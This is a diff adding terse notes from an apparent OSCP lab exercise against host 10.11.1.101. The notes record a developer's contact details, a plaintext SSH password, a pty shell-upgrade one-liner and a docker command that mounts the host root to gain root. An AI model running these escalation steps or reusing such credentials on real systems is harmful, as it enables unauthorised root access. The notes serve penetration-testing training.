@@ -1,0 +1,20 @@
+http://10.11.1.101/contactus.html
+
+Developer:
+Name: Alfred
+E-mail: alfred@oscp.thinc.local
+Year of birth: 1988
+
+http://10.11.1.101/passwords
+
+http://10.11.1.101/passwords/alfred-pas.html
+
+ssh: alfred : IHopeThisDoesNotExpire
+
+python -c "import pty;pty.spawn('/bin/sh')"
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+cat README.txt
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
